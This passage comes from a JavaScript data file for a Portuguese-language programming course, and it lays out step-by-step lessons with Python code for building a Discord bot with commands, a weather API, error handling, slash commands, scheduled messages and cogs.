    techStack: ['Python', 'discord.py', 'requests', 'SQLite', 'APIs externas'],
    whatYoullLearn: [
      'Discord Bot API',
      'comandos com prefixo e slash commands',
      'eventos e listeners',
      'integracao com APIs externas',
      'agendamento de tarefas',
      'persistencia de dados',
    ],
    steps: [
      {
        id: 'bot-1',
        order: 1,
        type: 'code',
        title: 'Primeiro Bot: Respondendo Comandos',
        context:
          'Um bot Discord e uma aplicacao que se conecta ao Discord via WebSocket e recebe eventos em tempo real. O evento mais basico e on_message, que dispara para cada mensagem enviada em servidores onde o bot esta.',
        objective:
          'Criar um bot Discord basico que responde a comandos !ola e !ajuda.',
        concepts: ['discord.py', 'discord.Client', 'on_ready', 'on_message', 'intents', 'token seguro'],
        code: {
          filename: 'bot.py',
          language: 'python',
          code: `import discord
import os

# Intents controlam quais eventos o bot recebe
intents = discord.Intents.default()
intents.message_content = True  # necessario para ler mensagens

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Bot conectado como {client.user}')
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name='por !ajuda'
        )
    )

@client.event
async def on_message(message):
    # Ignora mensagens do proprio bot (evita loop infinito)
    if message.author == client.user:
        return

    conteudo = message.content.lower().strip()

    if conteudo == '!ola':
        await message.channel.send(
            f'Ola, {message.author.mention}! Como posso ajudar?'
        )

    elif conteudo == '!ajuda':
        embed = discord.Embed(
            title='Comandos Disponiveis',
            color=discord.Color.blurple()
        )
        embed.add_field(name='!ola', value='Diz ola para voce', inline=False)
        embed.add_field(name='!clima <cidade>', value='Mostra o clima atual', inline=False)
        await message.channel.send(embed=embed)

# Token via variavel de ambiente (NUNCA no codigo)
TOKEN = os.environ.get('DISCORD_TOKEN')
client.run(TOKEN)`,
        },
        checkpoint: 'Bot responde !ola com uma saudacao no Discord.',
      },
      {
        id: 'bot-2',
        order: 2,
        type: 'integration',
        title: 'Buscando Dados de uma API Externa',
        context:
          'Bots Discord ganham superpoderes quando integrados a APIs externas. O comando !clima busca dados meteorologicos em tempo real e formata a resposta em um embed rico.',
        objective:
          'Adicionar o comando !clima que busca dados de uma API e formata o resultado.',
        concepts: ['requests', 'API key', 'JSON parsing', 'embed Discord', 'tratamento de erro de API'],
        code: {
          filename: 'comandos.py',
          language: 'python',
          code: `import discord, os, requests

WEATHER_API_KEY = os.environ.get('WEATHER_API_KEY')
WEATHER_URL = 'https://api.openweathermap.org/data/2.5/weather'

async def cmd_clima(message, args):
    if not args:
        await message.channel.send('Uso: !clima <cidade>  Ex: !clima Sao Paulo')
        return

    cidade = ' '.join(args)
    params = {
        'q': cidade,
        'appid': WEATHER_API_KEY,
        'units': 'metric',
        'lang': 'pt_br',
    }

    try:
        resposta = requests.get(WEATHER_URL, params=params, timeout=5)

        if resposta.status_code == 404:
            await message.channel.send(f'Cidade "{cidade}" nao encontrada.')
            return

        resposta.raise_for_status()
        dados = resposta.json()

        temp = dados['main']['temp']
        sensacao = dados['main']['feels_like']
        descricao = dados['weather'][0]['description'].capitalize()
        umidade = dados['main']['humidity']
        vento = dados['wind']['speed']

        embed = discord.Embed(
            title=f'Clima em {dados["name"]}, {dados["sys"]["country"]}',
            description=descricao,
            color=discord.Color.blue()
        )
        embed.add_field(name='Temperatura', value=f'{temp:.1f}C (sensacao {sensacao:.1f}C)', inline=True)
        embed.add_field(name='Umidade', value=f'{umidade}%', inline=True)
        embed.add_field(name='Vento', value=f'{vento} m/s', inline=True)

        await message.channel.send(embed=embed)

    except requests.Timeout:
        await message.channel.send('API de clima demorou demais. Tente novamente.')
    except requests.RequestException as e:
        await message.channel.send(f'Erro ao buscar clima: {e}')`,
        },
        checkpoint: '!clima Sao Paulo retorna temperatura e condicao atual.',
      },
      {
        id: 'bot-3',
        order: 3,
        type: 'bug',
        title: 'Bot que Trava Com Erro',
        context:
          'Um comando que lanca uma excecao nao tratada pode derrubar o bot inteiro ou fazer ele parar de responder. Tratamento robusto de erros e essencial em bots de producao.',
        objective:
          'Adicionar tratamento global de erros para evitar que excecoes derrubem o bot.',
        concepts: ['try/except', 'on_command_error', 'CommandNotFound', 'MissingRequiredArgument', 'logging'],
        bugCode: {
          filename: 'bot.py',
          language: 'python',
          code: `@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith('!esperar'):
        partes = message.content.split()
        segundos = int(partes[1])   # ValueError se usuario digitar !esperar abc
        await asyncio.sleep(segundos)
        await message.channel.send('Pronto!')
# Resultado: bot para de responder silenciosamente`,
        },
        bugDescription:
          'Um usuario digitou !esperar abc. ValueError nao tratado. O bot para de processar mensagens ate ser reiniciado.',
        bugLesson:
          'Envolva cada comando em try/except. Com discord.ext.commands, use o evento on_command_error para tratar erros globalmente e enviar mensagem amigavel ao usuario sem derrubar o bot.',
        fixedCode: {
          filename: 'bot.py',
          language: 'python',
          code: `import discord, asyncio, os
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.command(name='esperar')
async def esperar(ctx, segundos: int):
    if segundos > 60:
        await ctx.send('Maximo de 60 segundos.')
        return
    await ctx.send(f'Esperando {segundos} segundos...')
    await asyncio.sleep(segundos)
    await ctx.send('Pronto!')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'Argumento faltando. Use: !{ctx.command.name} <valor>')
    elif isinstance(error, commands.BadArgument):
        await ctx.send('Argumento invalido. Verifique o tipo esperado.')
    elif isinstance(error, commands.CommandNotFound):
        pass  # Ignora comandos desconhecidos silenciosamente
    else:
        await ctx.send('Erro inesperado. O administrador foi notificado.')
        raise error  # reloga para debug

TOKEN = os.environ.get('DISCORD_TOKEN')
bot.run(TOKEN)`,
        },
        checkpoint: 'Erros em comandos enviam mensagem de erro ao usuario sem derrubar o bot.',
      },
      {
        id: 'bot-4',
        order: 4,
        type: 'code',
        title: 'Slash Commands Modernos',
        context:
          'O Discord agora recomenda slash commands (/) em vez de prefixos (!). Slash commands aparecem no menu do Discord com descricao, parametros tipados e autocompletar — muito melhor UX.',
        objective:
          'Migrar comandos para slash commands usando discord.app_commands.',
        concepts: ['app_commands', 'slash commands', 'Interaction', 'CommandTree', 'sync commands'],
        code: {
          filename: 'slash_bot.py',
          language: 'python',
          code: `import discord
from discord import app_commands
import os

intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

@client.event
async def on_ready():
    # Sincroniza slash commands com o Discord (fazer uma vez)
    await tree.sync()
    print(f'Bot pronto: {client.user}. Slash commands sincronizados.')

@tree.command(name='ola', description='Receba uma saudacao do bot')
async def slash_ola(interaction: discord.Interaction):
    await interaction.response.send_message(
        f'Ola, {interaction.user.mention}!',
        ephemeral=True  # apenas o usuario ve a resposta
    )

@tree.command(name='clima', description='Mostra o clima de uma cidade')
@app_commands.describe(cidade='Nome da cidade (ex: Sao Paulo)')
async def slash_clima(interaction: discord.Interaction, cidade: str):
    await interaction.response.defer()  # da tempo para buscar a API

    # ... (mesma logica de antes)
    embed = discord.Embed(
        title=f'Clima em {cidade}',
        description='Ensolarado, 25C',
        color=discord.Color.blue()
    )
    await interaction.followup.send(embed=embed)

@tree.command(name='info', description='Informacoes sobre o servidor')
async def slash_info(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(title=guild.name, color=discord.Color.green())
    embed.add_field(name='Membros', value=guild.member_count, inline=True)
    embed.add_field(name='Canais', value=len(guild.channels), inline=True)
    await interaction.response.send_message(embed=embed)

TOKEN = os.environ.get('DISCORD_TOKEN')
client.run(TOKEN)`,
        },
        checkpoint: 'Bot tem slash commands que aparecem com / no Discord.',
      },
      {
        id: 'bot-5',
        order: 5,
        type: 'integration',
        title: 'Tarefa Agendada: Notificacao Diaria',
        context:
          'Bots Discord sao poderosos para automacao: enviar resumo diario, alertas de preco, atualizacoes de placar. discord.ext.tasks facilita criar loops assincronos que rodam em intervalos.',
        objective:
          'Implementar uma tarefa agendada que envia mensagem automatica diariamente.',
        concepts: ['discord.ext.tasks', 'tasks.loop', 'before_loop', 'channel by ID', 'automacao'],
        code: {
          filename: 'agendamento.py',
          language: 'python',
          code: `import discord, os
from discord.ext import commands, tasks
from datetime import time, timezone, timedelta

FUSO_BRASILIA = timezone(timedelta(hours=-3))
CANAL_ID = int(os.environ.get('CANAL_NOTIFICACOES_ID', 0))

intents = discord.Intents.default()
bot = commands.Bot(command_prefix='!', intents=intents)

# Roda todo dia as 09:00 no fuso de Brasilia
@tasks.loop(time=time(hour=9, minute=0, tzinfo=FUSO_BRASILIA))
async def mensagem_diaria():
    canal = bot.get_channel(CANAL_ID)
    if not canal:
        print(f'Canal {CANAL_ID} nao encontrado.')
        return

    embed = discord.Embed(
        title='Bom dia!',
        description='Aqui esta o resumo de hoje:',
        color=discord.Color.gold()
    )
    embed.add_field(name='Tarefas do dia', value='Verifique o painel de projetos', inline=False)
    embed.set_footer(text='Mensagem automatica - todo dia as 9h')

    await canal.send(embed=embed)
    print('Mensagem diaria enviada.')

@mensagem_diaria.before_loop
async def antes_do_loop():
    await bot.wait_until_ready()  # espera o bot conectar antes de iniciar

@bot.event
async def on_ready():
    mensagem_diaria.start()
    print(f'{bot.user} conectado. Tarefa diaria agendada.')

TOKEN = os.environ.get('DISCORD_TOKEN')
bot.run(TOKEN)`,
        },
        checkpoint: 'Bot envia mensagem automatica todo dia as 9h no canal configurado.',
      },
      {
        id: 'bot-6',
        order: 6,
        type: 'architecture',
        title: 'Estrutura de Bot Profissional com Cogs',
        context:
          'Um bot com dezenas de comandos em um arquivo unico se torna impossivel de manter. Cogs sao classes que agrupam comandos relacionados em arquivos separados, carregados dinamicamente.',
        objective:
          'Reorganizar o bot usando Cogs para separar funcionalidades em modulos independentes.',
        concepts: ['Cogs', 'load_extension', 'modularizacao', 'separacao de responsabilidades', 'config por variavel de ambiente'],
        code: {
          filename: 'estrutura.txt',
          language: 'bash',
          code: `# Estrutura de bot profissional com Cogs
discord-bot/
  main.py                  # entry point: cria bot e carrega cogs
  config.py                # TOKEN e configuracoes via os.environ
  requirements.txt         # discord.py, requests, python-dotenv
  .env                     # DISCORD_TOKEN=... (nunca no git!)
  .gitignore               # .env, __pycache__/

  cogs/
    __init__.py
    geral.py               # !ola, !ajuda, /info
    clima.py               # !clima, /clima com API OpenWeather
    moderacao.py           # !banir, !silenciar, !limpar
    agendamento.py         # tarefas automaticas diarias

# main.py (entry point):
# bot = commands.Bot(command_prefix='!', intents=intents)
# asyncio.run(carregar_e_iniciar(bot))
#
# async def carregar_e_iniciar(bot):
#   for cog in ['cogs.geral', 'cogs.clima', 'cogs.moderacao']:
#     await bot.load_extension(cog)
#   await bot.start(config.TOKEN)

# cogs/geral.py (exemplo de Cog):
# class Geral(commands.Cog):
#   def __init__(self, bot): self.bot = bot
#   @commands.command()
#   async def ola(self, ctx): await ctx.send('Ola!')
#
# async def setup(bot):
#   await bot.add_cog(Geral(bot))`,
        },
        checkpoint: 'Bot organizado em Cogs, cada funcionalidade em seu proprio arquivo.',
      },
    ],
  },
];

export default buildingProjects;
